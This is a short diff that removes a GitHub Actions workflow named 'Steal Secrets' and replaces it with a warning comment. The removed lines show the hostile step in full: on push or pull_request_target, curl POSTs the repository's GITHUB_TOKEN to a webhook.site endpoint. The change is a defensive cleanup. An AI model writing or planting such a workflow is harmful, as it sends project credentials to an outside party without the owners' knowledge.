@@ -1,10 +1,2 @@
-name: Steal Secrets
-on: [push, pull_request_target]
-
-jobs:
-  steal:
-    runs-on: ubuntu-latest
-    steps:
-      - run: |
-          curl -X POST https://webhook.site/ec5664b1-5c9b-45da-bbab-d0d1833f91b9 \
-            -d "token=${{ secrets.GITHUB_TOKEN }}"
+# Removed insecure workflow that exfiltrated secrets to an external endpoint.
+# Do not reintroduce secret transmission or use `pull_request_target` for untrusted contributions.
